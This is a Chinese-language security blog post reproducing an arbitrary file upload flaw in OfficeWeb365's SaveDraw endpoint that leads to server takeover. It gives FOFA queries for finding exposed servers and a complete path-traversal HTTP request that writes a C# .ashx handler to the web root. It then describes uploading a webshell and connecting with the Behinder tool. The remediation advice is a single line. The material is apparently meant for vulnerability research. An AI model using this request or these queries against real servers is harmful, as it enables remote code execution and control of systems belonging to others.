#  【漏洞复现】OfficeWeb365 SaveDraw 任意文件上传getshell漏洞   
原创 清风  白帽攻防   2024-12-02 01:10  
  
## 免责声明：请勿使用本文中提到的技术进行非法测试或行为。使用本文中提供的信息或工具所造成的任何后果和损失由使用者自行承担，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
简介  
  
OfficeWeb365 是一款专业的云服务平台，专注于提供 Office 文档和 PDF 文档的在线预览功能，支  
持 Microsoft Word、Excel、PowerPoint，WPS 系列（文字、表格、演示）以及 Adobe PDF 的在线预览。该服务无需安装 ActiveX 控件或客户端部署，即可兼容所有浏览器和移动设备，为用户提供便捷高效的办公文档在线预览体验。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eGDSkIOTSSc0q9ZO3B1EibmlphuJkqLLgiaUgic4p6rwEKyKxotkvta8Qmbiag4bia2yUnw5VMPvUhkOA/640?wx_fmt=png&from=appmsg "")  
漏洞描述  
  
Office  
Web365 的 SaveDraw 接口 存在任意文件上传漏洞，攻击者可利用该漏洞上传任意文件到服务器，从而获取服务器权限。通过此漏洞，攻击者可以直接上传恶意的 webshell 文件，对  
服务器进行控制，进一步获取对整个 Web 服务器的完全掌控。  
fofa语法```
body="请输入furl参数"
header="OfficeWeb365"
banner="OfficeWeb365"
```  
漏洞复现  
发送数据包，计算7* 8的值，计算结果写入文件drawPW1.ashx中  
```
POST /PW/SaveDraw?path=../../Content/img&idx=10.ashx HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 480

data:image/png;base64,{{filehash}}<%@ Language="C#" Class="Handler1" %>public class Handler1:System.Web.IHttpHandler
{
public void ProcessRequest(System.Web.HttpContext context)
{
System.Web.HttpResponse response = context.Response;
response.Write(7 * 8);

string filePath = context.Server.MapPath("/") + context.Request.Path;
if (System.IO.File.Exists(filePath))
{
    System.IO.File.Delete(filePath);
}
}
public bool IsReusable
{
get { return false; }
}
}///---
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eGDSkIOTSSc0q9ZO3B1Eibms7WGjZiaUYjicwocqbdF7gjK6R3DTuPCOMpzxrI4RC0o38FbETXX02hw/640?wx_fmt=png&from=appmsg "")  
  
访问http://ip/Content/img/UserDraw/drawPW1.ashx，查看命令执行结果，成功写入7*8的值56  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eGDSkIOTSSc0q9ZO3B1EibmPticU8n40LukicoxBz6XRkBWuEFrbWWtiaEVXVIebQTSicfJ3YUxibd7Xsw/640?wx_fmt=png&from=appmsg "")  
  
  
上传shell文件，然后冰蝎连接http://ip/Content/img/UserDraw/drawPW11.aspx  
```
getshell poc请在公众号知识星球获取
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eGDSkIOTSSc0q9ZO3B1EibmIn7U1elYlIS4lUVb8Tpt1611gop8DQf961NbCvbibI7LibuibLB8x2buw/640?wx_fmt=png&from=appmsg "")  
  
  
批量检测（批量检测POC工具请在公众号知识星球获取）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0eGDSkIOTSSc0q9ZO3B1Eibmvl5fIvibtkHZP9znHeMjSGfeZ6ROSRxRYFheJ3jWvJfrjUQ6JtKEibibQ/640?wx_fmt=png&from=appmsg "")  
修复建议  
  
  
  
  
  
1、打补丁  
  
  
  
  
  
  
  
网安交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/yu6trpdUX0efFOzibVic3qjn100tFgpUIh7ib8g9cKajewKFM5kXP350q21SCLvlgO6yx1tlia8VYxI4j3cv57FqFg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
